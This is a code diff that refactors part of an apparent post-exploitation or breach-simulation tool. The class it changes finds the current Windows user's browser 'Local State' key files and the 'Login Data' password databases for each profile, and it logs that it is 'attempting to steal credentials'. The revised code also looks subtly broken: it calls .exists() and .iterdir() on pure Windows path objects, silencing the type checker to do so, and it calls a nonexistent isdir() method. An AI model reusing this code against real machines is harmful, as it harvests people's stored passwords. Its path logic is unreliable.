@@ -8,7 +8,6 @@ import base64
 import getpass
 import json
 import logging
-import os
 from ctypes import (
     POINTER,
     Structure,
@@ -21,8 +20,8 @@ from ctypes import (
     sizeof,
 )
 from ctypes.wintypes import BOOL, DWORD, HANDLE, HWND, LPCWSTR, LPVOID, LPWSTR
-from pathlib import PurePath
-from typing import Optional, Sequence, Set, Tuple
+from pathlib import Path, PureWindowsPath
+from typing import Dict, Optional, Set, Tuple
 
 logger = logging.getLogger(__name__)
 
@@ -108,36 +107,33 @@ class WindowsCredentialsDatabaseSelector:
         user = getpass.getuser()
         local_appdata = LOCAL_APPDATA.format(drive=DRIVE, user=user)
 
-        self._browsers = {}
+        self._browsers: Dict[str, PureWindowsPath] = {}
         for browser_name, browser_directory in WINDOWS_BROWSERS.items():
-            self._browsers[browser_name] = browser_directory.format(local_appdata=local_appdata)
+            self._browsers[browser_name] = PureWindowsPath(
+                browser_directory.format(local_appdata=local_appdata)
+            )
 
-    def __call__(self) -> Sequence[PurePath]:
-        return self._get_database_dirs()
-
-    # TODO: use pathlib.Path objects everywhere, not str
-    def _get_database_dirs(self) -> Tuple[Set[str], Optional[bytes]]:
+    def __call__(self) -> Tuple[Set[PureWindowsPath], Optional[bytes]]:
         """
         Get browsers' credentials' database directories for current user
         """
 
-        databases: Set[str] = set()
+        databases: Set[PureWindowsPath] = set()
 
         for browser_name, browser_installation_path in self._browsers.items():
             logger.info(f'Attempting to steal credentials from browser "{browser_name}"')
 
-            local_state_file_path = os.path.join(browser_installation_path, "Local State")
-            if os.path.exists(local_state_file_path):
+            local_state_file_path = browser_installation_path / Path("Local State")
+            if local_state_file_path.exists():  # type: ignore [attr-defined]
                 master_key = None
 
                 # user profiles in the browser; empty string means current dir, without a profile
                 browser_profiles = {"Default", ""}
 
                 # get all additional browser profiles
-                for dirs in os.listdir(browser_installation_path):
-                    dirs_path = os.path.join(browser_installation_path, dirs)
-                    if os.path.isdir(dirs_path) and dirs.startswith("Profile"):
-                        browser_profiles.add(dirs)
+                for item in browser_installation_path.iterdir():  # type: ignore [attr-defined]
+                    if item.isdir() and item.name.startswith("Profile"):
+                        browser_profiles.add(item.name)
 
                 with open(local_state_file_path) as f:
                     try:
@@ -175,7 +171,8 @@ class WindowsCredentialsDatabaseSelector:
                 # each user profile has its own password database
                 for profile in browser_profiles:
                     try:
-                        db_files = os.listdir(os.path.join(browser_installation_path, profile))
+                        profile_directory = browser_installation_path / Path(profile)
+                        db_files = profile_directory.iterdir()  # type: ignore [attr-defined]
                     except Exception as err:
                         logger.error(
                             "Exception encountered while trying to get "
@@ -183,7 +180,7 @@ class WindowsCredentialsDatabaseSelector:
                         )
 
                     for db in db_files:
-                        if db.lower() == "login data":
-                            databases.add(os.path.join(browser_installation_path, profile, db))
+                        if db.name.lower() == "login data":
+                            databases.add(db)
 
         return databases, master_key
